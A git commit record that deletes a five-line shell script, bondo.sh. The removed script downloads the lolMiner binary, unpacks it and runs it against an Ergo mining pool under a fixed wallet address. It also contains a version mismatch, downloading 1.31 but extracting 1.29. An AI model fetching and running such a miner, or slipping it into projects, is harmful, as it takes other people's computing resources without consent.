617c932240d79c47075e0c9dcd6ad94c677e3300
harummir <88335789+harummir@users.noreply.github.com>
2021-08-13 02:29:44 -0400

    Delete bondo.sh

--- bondo.sh
+++
@@ -1,5 +0,0 @@
-apt-get install wget -y
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
-tar -xvf lolMiner_v1.29_Lin64.tar.gz
-cd 1.31
-./lolMiner --algo AUTOLYKOS2 --pool ergo.herominers.com:10250 -u 9iBQygF3jotYsT1JogiGvfdC7Ve8pLrPuqyqX5KR6kudFMn4eSs.RIG_LOL
